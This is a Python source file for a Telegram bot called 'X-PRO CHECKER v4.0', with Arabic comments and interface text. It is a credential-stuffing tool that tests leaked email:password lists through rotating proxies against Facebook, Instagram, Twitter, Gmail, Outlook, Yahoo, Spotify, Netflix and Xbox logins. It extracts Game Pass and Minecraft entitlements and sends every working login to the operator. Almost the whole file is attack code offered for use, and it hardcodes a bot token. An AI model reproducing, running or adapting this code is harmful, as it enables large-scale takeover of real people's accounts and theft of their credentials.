import os
import re
import time
import json
import threading
import random
import requests
import urllib3
from datetime import datetime
from requests.adapters import HTTPAdapter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# =================== إعدادات البوت ===================
BOT_TOKEN = "8937386411:AAGKAckcO69bj-g9eH38yn2S1anlRYgHTCk"

# =================== إعدادات متقدمة ===================
MAX_WORKERS = 30
REQUEST_TIMEOUT = 20
DELAY_BETWEEN_CHECKS = 0.3

# =================== إنشاء المجلدات ===================
os.makedirs("downloads", exist_ok=True)
os.makedirs("results", exist_ok=True)
os.makedirs("proxies", exist_ok=True)

urllib3.disable_warnings()

# =================== الإحصائيات العامة ===================
stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "bad": 0,
    "errors": 0,
    "start_time": 0,
    "is_running": False
}

# =================== نتائج كل منصة ===================
results = {
    "facebook": [],
    "instagram": [],
    "twitter": [],
    "gmail": [],
    "outlook": [],
    "yahoo": [],
    "spotify": [],
    "netflix": [],
    "xbox": [],
    "minecraft": [],
    "gamepass": []
}

# =================== كلاس الفحص ===================
class PlatformChecker:
    
    @staticmethod
    def check_facebook(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.facebook.com/", timeout=REQUEST_TIMEOUT)
            lsd = re.search(r'name="lsd" value="([^"]+)"', resp.text)
            jazoest = re.search(r'name="jazoest" value="([^"]+)"', resp.text)
            if not lsd or not jazoest:
                return {"status": "error", "platform": "Facebook", "email": email}
            login_data = {
                "lsd": lsd.group(1),
                "jazoest": jazoest.group(1),
                "email": email,
                "pass": password,
                "login": "Log In"
            }
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://www.facebook.com/login/", data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if "home.php" in login_resp.url or "facebook.com/?sk=welcome" in login_resp.url:
                name_match = re.search(r'"name":"([^"]+)"', login_resp.text)
                name = name_match.group(1) if name_match else "N/A"
                return {"status": "hit", "platform": "Facebook", "email": email, "password": password, "name": name, "extra": f"Name: {name}"}
            if "checkpoint" in login_resp.url:
                return {"status": "2fa", "platform": "Facebook", "email": email}
            return {"status": "bad", "platform": "Facebook", "email": email}
        except:
            return {"status": "error", "platform": "Facebook", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_instagram(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.instagram.com/", timeout=REQUEST_TIMEOUT)
            csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text)
            if not csrf:
                return {"status": "error", "platform": "Instagram", "email": email}
            headers = {
                "User-Agent": "Mozilla/5.0",
                "X-CSRFToken": csrf.group(1),
                "Content-Type": "application/x-www-form-urlencoded"
            }
            login_data = {
                "username": email,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": "{}"
            }
            login_resp = session.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", data=login_data, headers=headers, timeout=REQUEST_TIMEOUT)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("authenticated"):
                    return {"status": "hit", "platform": "Instagram", "email": email, "password": password, "user_id": data.get("userId", "N/A"), "extra": f"User ID: {data.get('userId', 'N/A')}"}
                if data.get("two_factor_required"):
                    return {"status": "2fa", "platform": "Instagram", "email": email}
            return {"status": "bad", "platform": "Instagram", "email": email}
        except:
            return {"status": "error", "platform": "Instagram", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_twitter(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://twitter.com/", timeout=REQUEST_TIMEOUT)
            token = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
            if not token:
                return {"status": "error", "platform": "Twitter", "email": email}
            login_data = {
                "authenticity_token": token.group(1),
                "session[username_or_email]": email,
                "session[password]": password,
                "remember_me": "1"
            }
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://twitter.com/sessions", data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if "/home" in login_resp.url:
                return {"status": "hit", "platform": "Twitter", "email": email, "password": password, "extra": "Login Successful"}
            return {"status": "bad", "platform": "Twitter", "email": email}
        except:
            return {"status": "error", "platform": "Twitter", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_gmail(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://accounts.google.com/ServiceLogin?service=mail", timeout=REQUEST_TIMEOUT)
            galx = re.search(r'name="GALX" value="([^"]+)"', resp.text)
            if not galx:
                return {"status": "error", "platform": "Gmail", "email": email}
            login_data = {"Email": email, "Passwd": password, "GALX": galx.group(1), "service": "mail"}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://accounts.google.com/ServiceLoginAuth", data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if "mail.google.com" in login_resp.url:
                return {"status": "hit", "platform": "Gmail", "email": email, "password": password, "extra": "Access Granted"}
            if "signin/challenge" in login_resp.url:
                return {"status": "2fa", "platform": "Gmail", "email": email}
            return {"status": "bad", "platform": "Gmail", "email": email}
        except:
            return {"status": "error", "platform": "Gmail", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_outlook(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://login.live.com/", timeout=REQUEST_TIMEOUT)
            sftag = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
            if not sftag:
                return {"status": "error", "platform": "Outlook", "email": email}
            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sftag.group(1),
                "type": "11"
            }
            login_resp = session.post("https://login.live.com/", data=login_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if "outlook.live.com" in login_resp.url or "mail.live.com" in login_resp.url:
                return {"status": "hit", "platform": "Outlook", "email": email, "password": password, "extra": "Access Granted"}
            if "incorrect" in login_resp.text.lower() or "doesn't exist" in login_resp.text.lower():
                return {"status": "bad", "platform": "Outlook", "email": email}
            if "security challenge" in login_resp.text.lower() or "two-step" in login_resp.text.lower():
                return {"status": "2fa", "platform": "Outlook", "email": email}
            return {"status": "bad", "platform": "Outlook", "email": email}
        except:
            return {"status": "error", "platform": "Outlook", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_yahoo(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://login.yahoo.com/", timeout=REQUEST_TIMEOUT)
            crumb = re.search(r'"crumb":"([^"]+)"', resp.text)
            if not crumb:
                return {"status": "error", "platform": "Yahoo", "email": email}
            login_data = {"username": email, "password": password, "crumb": crumb.group(1)}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            login_resp = session.post("https://login.yahoo.com/account/challenge/password", json=login_data, headers=headers, timeout=REQUEST_TIMEOUT)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("success"):
                    return {"status": "hit", "platform": "Yahoo", "email": email, "password": password, "extra": "Login Successful"}
                return {"status": "bad", "platform": "Yahoo", "email": email}
            return {"status": "bad", "platform": "Yahoo", "email": email}
        except:
            return {"status": "error", "platform": "Yahoo", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_spotify(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://accounts.spotify.com/", timeout=REQUEST_TIMEOUT)
            csrf = re.search(r'name="csrf_token" value="([^"]+)"', resp.text)
            if not csrf:
                return {"status": "error", "platform": "Spotify", "email": email}
            login_data = {"email": email, "password": password, "csrf_token": csrf.group(1), "remember": "1"}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            login_resp = session.post("https://accounts.spotify.com/login/", data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if "spotify.com/account" in login_resp.url or "spotify.com/home" in login_resp.url:
                return {"status": "hit", "platform": "Spotify", "email": email, "password": password, "extra": "Premium Checked"}
            return {"status": "bad", "platform": "Spotify", "email": email}
        except:
            return {"status": "error", "platform": "Spotify", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_netflix(email, password, proxy=None):
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            resp = session.get("https://www.netflix.com/login", timeout=REQUEST_TIMEOUT)
            auth_url = re.search(r'"authURL":"([^"]+)"', resp.text)
            if not auth_url:
                return {"status": "error", "platform": "Netflix", "email": email}
            login_data = {"email": email, "password": password, "rememberMe": "true"}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            login_resp = session.post(auth_url.group(1), json=login_data, headers=headers, timeout=REQUEST_TIMEOUT)
            if login_resp.status_code == 200:
                data = login_resp.json()
                if data.get("success"):
                    return {"status": "hit", "platform": "Netflix", "email": email, "password": password, "extra": "Account Active"}
                return {"status": "bad", "platform": "Netflix", "email": email}
            return {"status": "bad", "platform": "Netflix", "email": email}
        except:
            return {"status": "error", "platform": "Netflix", "email": email}
        finally:
            session.close()
    
    @staticmethod
    def check_xbox(email, password, proxy=None):
        """فحص حساب Xbox بالكامل مع Game Pass و Minecraft"""
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        try:
            # تسجيل الدخول
            resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=REQUEST_TIMEOUT)
            sftag = re.search(r'name="PPFT" value="([^"]+)"', resp.text)
            if not sftag:
                return {"status": "error", "platform": "Xbox", "email": email}
            
            login_data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sftag.group(1),
                "type": "11"
            }
            login_resp = session.post("https://login.live.com/", data=login_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            # استخراج التوكن
            ms_token = None
            if 'access_token' in login_resp.url:
                ms_token = re.search(r'access_token=([^&\s"\']+)', login_resp.url)
                if ms_token:
                    ms_token = ms_token.group(1)
            
            if not ms_token:
                if "incorrect" in login_resp.text.lower():
                    return {"status": "bad", "platform": "Xbox", "email": email}
                if "security" in login_resp.text.lower() or "two-step" in login_resp.text.lower():
                    return {"status": "2fa", "platform": "Xbox", "email": email}
                return {"status": "bad", "platform": "Xbox", "email": email}
            
            # مصادقة Xbox
            xb_payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            
            if xb_req.status_code != 200:
                return {"status": "error", "platform": "Xbox", "email": email}
            
            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
            
            # جلب المعلومات
            gamertag = "N/A"
            gamerscore = "0"
            try:
                xsts_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                if xsts_req.status_code == 200:
                    xsts_token = xsts_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                                          headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': gamerscore = s['value']
            except:
                pass
            
            # التحقق من Minecraft و Game Pass
            has_gp = False
            has_mc = False
            gp_type = ""
            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                          json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                                          headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                                headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                            if ent_req.status_code == 200:
                                ent_text = ent_req.text
                                if 'product_game_pass_ultimate' in ent_text:
                                    gp_type = "Game Pass Ultimate"
                                    has_gp = True
                                elif 'product_game_pass_pc' in ent_text:
                                    gp_type = "PC Game Pass"
                                    has_gp = True
                                elif 'product_game_pass_console' in ent_text:
                                    gp_type = "Xbox Game Pass Console"
                                    has_gp = True
                                has_mc = 'product_minecraft' in ent_text
            except:
                pass
            
            # تحديد النوع
            platform_type = "Xbox"
            if has_gp:
                platform_type = "GamePass"
            elif has_mc:
                platform_type = "Minecraft"
            
            extra = f"Gamertag: {gamertag} | Score: {gamerscore}"
            if has_gp:
                extra += f" | {gp_type}"
            if has_mc:
                extra += " | Has Minecraft"
            
            return {
                "status": "hit",
                "platform": platform_type,
                "email": email,
                "password": password,
                "gamertag": gamertag,
                "gamerscore": gamerscore,
                "gamepass": gp_type if has_gp else "No",
                "minecraft": "Yes" if has_mc else "No",
                "extra": extra
            }
        except:
            return {"status": "error", "platform": "Xbox", "email": email}
        finally:
            session.close()

# =================== كلاس مدير الفحص ===================
class CheckerManager:
    def __init__(self):
        self.checkers = {
            "facebook": PlatformChecker.check_facebook,
            "instagram": PlatformChecker.check_instagram,
            "twitter": PlatformChecker.check_twitter,
            "gmail": PlatformChecker.check_gmail,
            "outlook": PlatformChecker.check_outlook,
            "yahoo": PlatformChecker.check_yahoo,
            "spotify": PlatformChecker.check_spotify,
            "netflix": PlatformChecker.check_netflix,
            "xbox": PlatformChecker.check_xbox
        }
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        if os.path.exists("proxies/proxy.txt"):
            with open("proxies/proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        elif os.path.exists("proxy.txt"):
            with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
    
    def get_proxy(self):
        return random.choice(self.proxies) if self.proxies else None
    
    def parse_proxy(self, proxy_str):
        if not proxy_str:
            return None
        parts = proxy_str.strip().split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return None
    
    def check_account(self, email, password, platforms=None):
        if platforms is None:
            platforms = list(self.checkers.keys())
        
        results_list = []
        proxy = self.get_proxy()
        parsed_proxy = self.parse_proxy(proxy) if proxy else None
        
        for platform in platforms:
            if platform in self.checkers:
                try:
                    result = self.checkers[platform](email, password, parsed_proxy)
                    results_list.append(result)
                except Exception as e:
                    results_list.append({
                        "status": "error",
                        "platform": platform,
                        "email": email,
                        "password": password,
                        "msg": str(e)
                    })
        return results_list

# =================== دوال البوت ===================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب - كل من يرسلها يصبح أدمن"""
    user_id = update.effective_user.id
    
    # تخزين معرف المستخدم كأدمن
    context.bot_data["admin_id"] = user_id
    
    keyboard = [
        [InlineKeyboardButton("📁 فحص ملف", callback_data="scan_file")],
        [InlineKeyboardButton("📝 فحص حساب واحد", callback_data="scan_single")],
        [InlineKeyboardButton("📊 الإحصائيات", callback_data="stats")],
        [InlineKeyboardButton("📤 النتائج", callback_data="get_results")],
        [InlineKeyboardButton("🔄 إعادة تحميل البروكسيات", callback_data="reload_proxies")],
        [InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_scan")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 *X-PRO CHECKER v4.0* 🔥\n\n"
        "👑 المطور: HackerExos\n"
        "📌 فحص متكامل لجميع المنصات\n\n"
        "✅ *المنصات المدعومة:*\n"
        "Facebook | Instagram | Twitter | Gmail | Outlook | Yahoo | Spotify | Netflix | Xbox (مع Game Pass & Minecraft)\n\n"
        "⚠️ *ملاحظة:* كل النتائج ترسل للخاص مباشرة\n\n"
        "اختر أحد الخيارات أدناه:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أزرار لوحة التحكم"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    admin_id = context.bot_data.get("admin_id")
    
    # التحقق من الأدمن
    if admin_id and user_id != admin_id:
        await query.edit_message_text("❌ هذا البوت للأدمن فقط.")
        return
    
    if query.data == "scan_file":
        await query.edit_message_text(
            "📁 أرسل ملف `combo.txt`\n"
            "الصيغة: `email:password`\n"
            "يمكنك إضافة بروكسيات في ملف `proxy.txt` (اختياري)\n\n"
            "⚠️ سيتم إرسال كل حساب صحيح فور اكتشافه للخاص"
        )
        context.user_data["waiting_file"] = True
    
    elif query.data == "scan_single":
        await query.edit_message_text(
            "📝 أرسل الحساب بالصيغة:\n"
            "`email|password`\n"
            "مثال: `user@gmail.com|pass123`"
        )
        context.user_data["waiting_single"] = True
    
    elif query.data == "stats":
        await show_stats(query, context)
    
    elif query.data == "get_results":
        await send_results(query, context)
    
    elif query.data == "reload_proxies":
        manager = context.bot_data.get("checker_manager")
        if manager:
            manager.load_proxies()
            await query.edit_message_text(f"✅ تم تحميل {len(manager.proxies)} بروكسي.")
        else:
            await query.edit_message_text("❌ المدير غير متاح.")
    
    elif query.data == "stop_scan":
        stats["is_running"] = False
        await query.edit_message_text("⏹ تم إيقاف الفحص.")

async def show_stats(query, context):
    """عرض الإحصائيات"""
    s = stats
    elapsed = int(time.time() - s["start_time"]) if s["start_time"] else 0
    
    msg = (
        "📊 *الإحصائيات*\n\n"
        f"📌 الحالة: {'🟢 يعمل' if s['is_running'] else '🔴 متوقف'}\n"
        f"📝 الإجمالي: {s['total']}\n"
        f"✅ تم الفحص: {s['checked']}\n"
        f"🎯 الضربات: {s['hits']}\n"
        f"❌ الفاشلة: {s['bad']}\n"
        f"⚠️ الأخطاء: {s['errors']}\n"
        f"⏱️ الوقت: {elapsed} ثانية\n"
        f"⚡ السرعة: {int(s['checked'] / max(elapsed, 1) * 60)} CPM"
    )
    
    # إحصائيات المنصات
    platform_stats = {}
    for platform, hits_list in results.items():
        if hits_list:
            platform_stats[platform] = len(hits_list)
    
    if platform_stats:
        msg += "\n\n📈 *نتائج المنصات:*\n"
        for plat, count in sorted(platform_stats.items(), key=lambda x: x[1], reverse=True):
            msg += f"• {plat}: {count}\n"
    
    await query.edit_message_text(msg, parse_mode="Markdown")

async def send_results(query, context):
    """إرسال نتائج الفحص للخاص"""
    sent = 0
    for platform, hits_list in results.items():
        if hits_list:
            filename = f"results/{platform}_hits.txt"
            with open(filename, "w", encoding="utf-8") as f:
                for hit in hits_list:
                    f.write(f"{json.dumps(hit)}\n")
            
            try:
                with open(filename, "rb") as f:
                    await query.message.reply_document(
                        document=f,
                        filename=f"{platform}_hits.txt",
                        caption=f"🎯 نتائج {platform}: {len(hits_list)} حساب"
                    )
                sent += 1
            except:
                pass
    
    if sent == 0:
        await query.edit_message_text("❌ لا توجد نتائج لعرضها.")
    else:
        await query.edit_message_text(f"✅ تم إرسال {sent} ملف نتائج للخاص.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الملفات المرسلة"""
    user_id = update.effective_user.id
    admin_id = context.bot_data.get("admin_id")
    
    if admin_id and user_id != admin_id:
        await update.message.reply_text("❌ هذا البوت للأدمن فقط.")
        return
    
    if not context.user_data.get("waiting_file"):
        await update.message.reply_text("⚠️ أرسل /start أولاً ثم اختر خيار فحص ملف.")
        return
    
    document = update.message.document
    if not document or not document.file_name.endswith(".txt"):
        await update.message.reply_text("❌ أرسل ملف نصي `.txt` فقط.")
        return
    
    file = await document.get_file()
    file_path = f"downloads/{document.file_name}"
    await file.download_to_drive(file_path)
    
    # تحديد نوع الملف
    if "proxy" in document.file_name.lower():
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        with open("proxies/proxy.txt", "w", encoding="utf-8") as f:
            for p in proxies:
                f.write(p + "\n")
        
        manager = context.bot_data.get("checker_manager")
        if manager:
            manager.proxies = proxies
        
        await update.message.reply_text(f"✅ تم تحميل {len(proxies)} بروكسي.")
        context.user_data["waiting_file"] = False
        return
    
    # قراءة الكومبو
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        combos = [line.strip() for line in f if ":" in line.strip()]
    
    if not combos:
        await update.message.reply_text("❌ الملف فارغ أو غير صالح.")
        return
    
    # بدء الفحص
    await update.message.reply_text(f"🚀 بدء الفحص على {len(combos)} حساب...\n📤 سيتم إرسال كل حساب صحيح فوراً للخاص.")
    
    # تشغيل الفحص في خيط منفصل
    threading.Thread(
        target=run_checker_thread,
        args=(combos, update.message.chat_id, context),
        daemon=True
    ).start()
    
    context.user_data["waiting_file"] = False

async def handle_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة حساب واحد"""
    user_id = update.effective_user.id
    admin_id = context.bot_data.get("admin_id")
    
    if admin_id and user_id != admin_id:
        await update.message.reply_text("❌ هذا البوت للأدمن فقط.")
        return
    
    if not context.user_data.get("waiting_single"):
        return
    
    text = update.message.text
    if "|" not in text:
        await update.message.reply_text("❌ الصيغة غير صحيحة. استخدم: `email|password`")
        return
    
    email, password = text.split("|", 1)
    email = email.strip()
    password = password.strip()
    
    await update.message.reply_text(f"🔍 جاري فحص `{email}` ...", parse_mode="Markdown")
    
    manager = context.bot_data.get("checker_manager")
    if manager:
        results_list = manager.check_account(email, password)
        
        msg = f"📋 *نتائج فحص {email}*\n\n"
        for result in results_list:
            status_icon = "✅" if result["status"] == "hit" else "🔐" if result["status"] == "2fa" else "❌" if result["status"] == "bad" else "⚠️"
            msg += f"{status_icon} *{result['platform']}*: {result['status']}"
            if result.get("extra"):
                msg += f"\n   └ {result['extra']}"
            msg += "\n"
            
            # حفظ وحساب الضربات
            if result["status"] == "hit":
                platform_key = result["platform"].lower()
                if platform_key not in results:
                    results[platform_key] = []
                results[platform_key].append(result)
                stats["hits"] += 1
                
                # إرسال الضربة فوراً للخاص
                hit_msg = f"🎯 *ضربة جديدة!*\n"
                hit_msg += f"📌 المنصة: {result['platform']}\n"
                hit_msg += f"📧 الإيميل: {result['email']}\n"
                hit_msg += f"🔑 كلمة المرور: {result['password']}\n"
                if result.get("extra"):
                    hit_msg += f"📝 معلومات: {result['extra']}\n"
                await update.message.reply_text(hit_msg, parse_mode="Markdown")
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ المدير غير متاح.")
    
    context.user_data["waiting_single"] = False

def run_checker_thread(combos, chat_id, context):
    """تشغيل الفحص في خيط منفصل"""
    global stats, results
    
    stats["is_running"] = True
    stats["total"] = len(combos)
    stats["checked"] = 0
    stats["hits"] = 0
    stats["bad"] = 0
    stats["errors"] = 0
    stats["start_time"] = time.time()
    
    manager = context.bot_data.get("checker_manager")
    if not manager:
        context.bot.send_message(chat_id, "❌ المدير غير متاح.")
        stats["is_running"] = False
        return
    
    # معالجة الكومبوهات
    for combo in combos:
        if not stats["is_running"]:
            break
        
        try:
            email, password = combo.split(":", 1)
            email = email.strip()
            password = password.strip()
        except:
            stats["bad"] += 1
            stats["checked"] += 1
            continue
        
        # فحص على جميع المنصات
        platforms = list(manager.checkers.keys())
        platform_results = manager.check_account(email, password, platforms)
        
        # تصنيف النتائج وإرسال الضربات فوراً
        for result in platform_results:
            if result["status"] == "hit":
                stats["hits"] += 1
                platform_key = result["platform"].lower()
                if platform_key not in results:
                    results[platform_key] = []
                results[platform_key].append(result)
                
                # إرسال الضربة فوراً للخاص
                hit_msg = f"🎯 *ضربة جديدة!*\n"
                hit_msg += f"📌 المنصة: {result['platform']}\n"
                hit_msg += f"📧 الإيميل: {result['email']}\n"
                hit_msg += f"🔑 كلمة المرور: {result['password']}\n"
                if result.get("extra"):
                    hit_msg += f"📝 معلومات: {result['extra']}\n"
                if result.get("gamertag"):
                    hit_msg += f"🎮 Gamertag: {result['gamertag']}\n"
                if result.get("gamerscore"):
                    hit_msg += f"🏆 Gamerscore: {result['gamerscore']}\n"
                if result.get("gamepass") and result["gamepass"] != "No":
                    hit_msg += f"🎁 Game Pass: {result['gamepass']}\n"
                if result.get("minecraft") and result["minecraft"] == "Yes":
                    hit_msg += f"⛏️ Minecraft: Yes\n"
                
                try:
                    context.bot.send_message(chat_id=chat_id, text=hit_msg, parse_mode="Markdown")
                except:
                    pass
                
            elif result["status"] == "bad":
                stats["bad"] += 1
            elif result["status"] == "error":
                stats["errors"] += 1
        
        stats["checked"] += 1
        
        # تحديث الحالة كل 20 حساب
        if stats["checked"] % 20 == 0:
            try:
                context.bot.send_message(
                    chat_id,
                    f"📊 التقدم: {stats['checked']}/{stats['total']} | 🎯 {stats['hits']} ضربة"
                )
            except:
                pass
    
    # انتهاء الفحص
    stats["is_running"] = False
    
    # إرسال التلخيص النهائي
    summary = f"""
✅ *تم الانتهاء من الفحص*
📊 *الملخص النهائي*

📝 الإجمالي: {stats['total']}
✅ تم الفحص: {stats['checked']}
🎯 الضربات: {stats['hits']}
❌ الفاشلة: {stats['bad']}
⚠️ الأخطاء: {stats['errors']}

👑 المطور: HackerExos
    """
    
    try:
        context.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown")
    except:
        pass

# =================== الدالة الرئيسية ===================
def main():
    """تشغيل البوت"""
    # إنشاء مدير الفحص
    manager = CheckerManager()
    
    # إنشاء التطبيق
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # تخزين المدير في data
    app.bot_data["checker_manager"] = manager
    app.bot_data["admin_id"] = None  # سيتم تعيينه عند أول /start
    
    # إضافة المعالجات
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_single))
    
    # تشغيل البوت
    print("🔥 X-PRO CHECKER v4.0")
    print("👑 المطور: HackerExos")
    print("🤖 البوت يعمل...")
    print("📌 أول من يرسل /start يصبح الأدمن")
    app.run_polling()

if __name__ == "__main__":
    main()
